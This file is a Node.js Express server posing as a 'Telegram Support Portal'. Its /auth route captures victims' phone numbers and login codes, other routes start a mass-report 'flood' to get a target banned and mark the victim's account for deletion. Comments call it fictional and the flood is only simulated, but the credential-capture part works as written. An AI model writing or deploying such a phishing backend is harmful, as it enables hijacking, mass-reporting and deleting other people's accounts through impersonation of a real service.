const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs-extra');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// In-memory store for sessions (for story realism)
const sessions = new Map();
const reportJobs = new Map();

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/status', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'status.html'));
});

app.get('/delete', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'delete.html'));
});

// Capture phone + code
app.post('/auth', (req, res) => {
  const { phone, code } = req.body;
  if (!phone || !code) {
    return res.status(400).json({ error: 'Phone and code required' });
  }

  const sessionId = uuidv4();
  sessions.set(sessionId, {
    phone,
    code,
    capturedAt: new Date().toISOString(),
    status: 'captured'
  });

  // Simulate session reset
  console.log(`[AUTH] Captured session for ${phone} | ID: ${sessionId}`);

  res.json({
    success: true,
    sessionId,
    message: 'Verification successful. Redirecting...'
  });
});

// Start report flood
app.post('/report', async (req, res) => {
  const { sessionId, phone } = req.body;
  if (!sessionId || !sessions.has(sessionId)) {
    return res.status(400).json({ error: 'Invalid session' });
  }

  const jobId = uuidv4();
  reportJobs.set(jobId, {
    sessionId,
    phone,
    startedAt: new Date().toISOString(),
    progress: 0,
    status: 'running',
    reportsSent: 0,
    targetReports: 120
  });

  // Simulate flood progress
  simulateFlood(jobId);

  res.json({
    success: true,
    jobId,
    message: 'Report flood initiated',
    eta: '9 minutes'
  });
});

// Status endpoint
app.get('/api/status/:jobId', (req, res) => {
  const job = reportJobs.get(req.params.jobId);
  if (!job) {
    return res.status(404).json({ error: 'Job not found' });
  }
  res.json(job);
});

// Force delete
app.post('/delete', (req, res) => {
  const { sessionId, reason } = req.body;
  if (!sessionId || !sessions.has(sessionId)) {
    return res.status(400).json({ error: 'Invalid session' });
  }

  const session = sessions.get(sessionId);
  session.status = 'deleted';
  session.deletedAt = new Date().toISOString();
  session.deleteReason = reason || 'I no longer want to use Telegram';

  console.log(`[DELETE] Account ${session.phone} marked for permanent deletion`);

  res.json({
    success: true,
    message: 'Account deletion request submitted. Permanent removal in 60 seconds.'
  });
});

// Simulate the report flood for realism
function simulateFlood(jobId) {
  const job = reportJobs.get(jobId);
  if (!job) return;

  const interval = setInterval(() => {
    if (job.reportsSent >= job.targetReports) {
      job.status = 'completed';
      job.progress = 100;
      clearInterval(interval);
      console.log(`[FLOOD] Job ${jobId} completed — target banned`);
      return;
    }

    job.reportsSent += Math.floor(Math.random() * 8) + 3;
    job.progress = Math.min(100, Math.floor((job.reportsSent / job.targetReports) * 100));
  }, 4000);
}

// Start server
app.listen(PORT, () => {
  console.log(`Telegram Support Portal running on http://localhost:${PORT}`);
  console.log('Ready for fictional deployment.');
});
